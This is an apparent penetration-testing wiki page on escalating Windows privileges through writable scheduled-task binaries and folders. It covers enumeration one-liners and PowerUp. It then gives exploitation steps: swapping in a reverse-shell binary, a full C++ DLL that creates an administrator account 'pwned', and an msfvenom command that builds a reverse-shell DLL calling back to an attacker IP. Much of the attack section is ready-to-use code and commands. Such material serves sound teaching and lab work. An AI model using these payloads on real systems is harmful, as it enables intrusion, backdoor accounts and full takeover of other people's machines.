# Weak File/Folder Permissions

## Theory

If we discover a Task that run with SYSTEM or highest privileges than our current user, the Task can be triggered, and If we have write permissions over the folder or the file (i.e binary or script) used by this task, then we can use it to escalate our privileges.

## Practice

### Task File Hijacking

{% tabs %}
{% tab title="Enumerate" %}
Given sufficient permissions over a task's file (binary or scripts), swapping it with our own binary enables us to gain code execution as the user configured to run this task.

To identify weaknesses in task file permissions, we can take the following steps: retrieve a complete list of all task binary files, retrieve their permissions, identify interesting permissions referring our controlled user.

#### LOLBAS

We may use the following PowerShell command to make this enumeration

```powershell
Get-ScheduledTask | ForEach-Object { $taskAction = $_.Actions.Execute; if ($taskAction -and (Test-Path $taskAction -ErrorAction SilentlyContinue)) { $taskName = $_.URI; $taskAction; Get-Acl -LiteralPath $taskAction -ErrorAction SilentlyContinue | Select-Object @{Name='TaskName';Expression={$taskName}}, AccessToString, Owner } }|fl
```

If we find an interesting ACL over a task binary, before replacing it, we want to check the task's trigger and RunAs user.

```powershell
# Check RunAs and Trigger
schtasks.exe /TN <TASK_NAME> /V /FO LIST
```

#### PowerUp

Alternatively, we can use `Get-ModifiableScheduledTaskFile` from [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

```powershell
. .\PowerUp.ps1
Get-ModifiableScheduledTaskFile
```
{% endtab %}

{% tab title="Exploit" %}
If we find an editable task file, we can simply replace it with a malicious one as follow:

```powershell
# Backup the binary/script
copy /y "c:\Program Files\File Permissions Task\filepermservice.exe" c:\Temp\filepermservice_backup.exe

# Hijack the binary/script
copy /y c:\Temp\reverse.exe "c:\Program Files\File Permissions Task\filepermservice.exe"
```

We can now wait for the task to be triggered, or trigger it ourselves if we can.
{% endtab %}
{% endtabs %}

### Task DLL Hijacking

{% hint style="info" %}
DLL hijacking can be applied in many other cases, but this section focuses solely on Scheduled Tasks. For a more comprehensive approach, please refer to [this page](../dll-hijacking.md).
{% endhint %}

{% tabs %}
{% tab title="Enumerate" %}
In case you have write permissions over the Task folder from wich a binary is executed, we can write our DLL in, and then hijack the DLL search order. Here is the default DLL search order in windows (in safe mode which is the default):&#x20;

1. The executable directory.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

We can enumerate permissive task folders by using the following PowerShell command

```powershell
Get-ScheduledTask | ForEach-Object { $taskAction = $_.Actions.Execute; if ($taskAction -and (Test-Path $taskAction -ErrorAction SilentlyContinue)) { $folderPath = Split-Path -Path $taskAction -Parent; $taskName = $_.TaskPath; $folderPath; Get-Acl -LiteralPath $folderPath -ErrorAction SilentlyContinue | Select-Object @{Name='TaskName';Expression={$taskName}}, AccessToString, Owner } } |fl
```

If we find a writable task folder, we first want to exfiltrate its service binary to a local windows machine. On this controlled computer, download [Process Monitor (procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to monitor for missing or hijackable DLLs.

In procomon, specify this three filters (edit the your\_service\_name.exe with the found binary you found):

<figure><img src="../../../.gitbook/assets/Capture d’écran_2023-11-09_01-29-36.png" alt=""><figcaption><p>Procmon Filters</p></figcaption></figure>
{% endtab %}

{% tab title="Exploit" %}
If we've found a DLL we can hijack, the hard part is over. Now let's compile a custom DLL using the following code (in this example, the vulnerable DLL is named "hijackme.dll").

{% code title="hijackme.cpp" %}
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user pwned P@ssword! /add");
  	    i = system ("net localgroup administrators pwned /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}

```bash
#Compile it
x86_64-w64-mingw32-gcc hijackme.cpp --shared -o hijackme.dll
```

Or use msfvenom to directly generate a malicious DLL.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> EXITFUNC=thread -f dll -o hijackme.dll
```

Now, after transferring the DLL to the target host, copy the DLL to the path we found.

```powershell
# Hijack the DLL 
copy /y c:\Temp\hijackme.dll "C:\Program Files\Folder Permissions Task\hijackme.dll"
```

We can now wait for the task to be triggered, or trigger it ourselves if we can.
{% endtab %}
{% endtabs %}
